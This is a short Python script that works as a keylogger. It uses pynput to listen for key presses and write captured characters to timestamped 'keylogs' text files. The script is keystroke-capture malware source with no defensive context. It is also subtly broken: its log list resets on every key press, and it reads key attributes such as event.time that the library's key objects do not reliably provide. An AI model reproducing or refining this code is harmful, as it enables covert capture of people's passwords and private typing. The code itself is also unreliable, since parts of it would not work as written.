import pynput
from pynput import keyboard as kb
from datetime import datetime
def log_key(event):
    logs = []
    if event.char != None:
        logs.append(str(event.char)) 
    elif event.vk == 13:
        logs.append('[ENTER]')
        with open("keylogs{}.txt".format(datetime.now().strftime("%Y%m%d-%H%M%S")),"w") as f:
            f.write(event.time) 
            f.write("\n")
            for i in logs:
                f.write("{}".format(i))

with kb.Listener(on_press=log_key, on_release=None) as listener:
    listener.run()   
